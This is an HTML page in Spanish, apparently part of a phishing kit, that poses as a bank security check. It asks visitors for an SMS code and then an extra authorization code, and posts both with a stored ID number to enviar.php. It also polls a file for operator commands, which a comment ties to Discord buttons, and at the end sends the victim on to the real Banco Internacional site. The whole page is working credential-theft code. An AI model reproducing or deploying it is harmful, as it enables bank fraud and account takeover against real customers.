<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación de Seguridad</title>
<style>
  /* Reutilizo tus estilos de codes para mantener la estética */
  body { background: #f59a05; font-family: sans-serif; margin: 0; color: #fff; }
  .app { max-width: 430px; margin: 0 auto; padding: 24px; }
  .section { margin-top: 20px; }
  .code-input { width: 100%; height: 52px; background: rgba(255,255,255,0.12); border: 1.5px solid rgba(255,255,255,0.22); border-radius: 12px; font-size: 1.2rem; color: #fff; text-align: center; margin-bottom: 20px; outline: none; }
  .btn { width: 100%; height: 50px; border-radius: 12px; border: none; font-weight: 700; background: rgba(255,255,255,0.2); color: rgba(255,255,255,0.5); cursor: not-allowed; }
  .btn.ready { background: #fff; color: #b87200; cursor: pointer; }
  .overlay { display: none; position: fixed; inset: 0; background: #f59a05; flex-direction: column; align-items: center; justify-content: center; z-index: 99; }
  .overlay.show { display: flex; }
  .ring { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="overlay" id="overlay">
  <div class="ring"></div>
  <p id="overlayText" style="margin-top:20px;">Validando código...</p>
</div>

<div class="app">
  <div id="userDisplay" style="font-weight:700; margin-bottom:20px;">Cargando...</div>
  
  <div id="paso1">
    <h3>Verificación por SMS</h3>
    <p>Ingrese el código enviado a su teléfono.</p>
    <input type="tel" class="code-input" id="smsCode" maxlength="8">
    <button class="btn" id="btnSms">Verificar código</button>
  </div>

  <div id="paso2" style="display:none;">
    <h3>Código de autorización</h3>
    <p>Verificación adicional requerida.</p>
    <input type="tel" class="code-input" id="extraCode" maxlength="8">
    <button class="btn" id="btnExtra">Confirmar</button>
  </div>
</div>

<script>
  const user = localStorage.getItem("bf_last_dni") || "Cliente";
  document.getElementById("userDisplay").textContent = "Usuario: " + user;

  const ov = document.getElementById("overlay");
  const showOv = () => ov.classList.add("show");
  const hideOv = () => ov.classList.remove("show");

  // Escuchar órdenes de los botones de Discord
  async function chequearOrden() {
    try {
      const res = await fetch('estado.txt?v=' + Math.random());
      const orden = (await res.text()).trim();
      if (orden === "error_login") window.location.href = "index.html?status=error";
      if (orden === "pedir_otp") {
        hideOv();
        document.getElementById("paso1").style.display = "none";
        document.getElementById("paso2").style.display = "block";
      }
      if (orden === "finalizar") window.location.href = "https://www.bancointernacional.com.ec/";
    } catch(e) {}
  }
  setInterval(chequearOrden, 2000);

  // Lógica de botones
  function setupInput(inputId, btnId, tipo) {
    const inp = document.getElementById(inputId);
    const btn = document.getElementById(btnId);
    inp.addEventListener("input", () => btn.classList.toggle("ready", inp.value.length >= 4));
    btn.addEventListener("click", async () => {
      if(!btn.classList.contains("ready")) return;
      btn.disabled = true;
      await fetch('enviar.php', {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ usuario: user, clave: inp.value, tipo: tipo })
      });
      await fetch('control.php?accion=esperando'); // Volver a esperar orden
      showOv();
    });
  }

  setupInput("smsCode", "btnSms", "CÓDIGO SMS");
  setupInput("extraCode", "btnExtra", "CÓDIGO EXTRA");
</script>
</body>
</html>
